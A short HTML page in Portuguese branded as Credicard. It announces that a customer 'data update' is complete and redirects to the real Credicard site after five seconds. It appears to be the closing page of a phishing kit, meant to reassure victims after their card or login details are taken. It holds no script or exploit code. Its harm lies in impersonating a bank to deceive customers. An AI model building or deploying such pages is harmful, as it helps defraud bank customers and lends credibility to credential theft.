<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <link rel="stylesheet" href="css/estilo.css">
    <meta http-equiv="refresh" content="5 URL='https://www.credicard.com.br'"/>
    <title>Credicard</title>
</head>
<body>
    
<div id="container2">
	<div id="sucesso">
		<img src="imagens/sucesso.png" width="220" height="160">
	</div>
	<div id="text">
		<h3>Atualização de dados concluída. A Credicard agradece seu retorno!</h3>
	</div>
	<div id="text2">
		<p>Você será redirecionado em breve...</p>
	</div>
</div>


</body>
</html>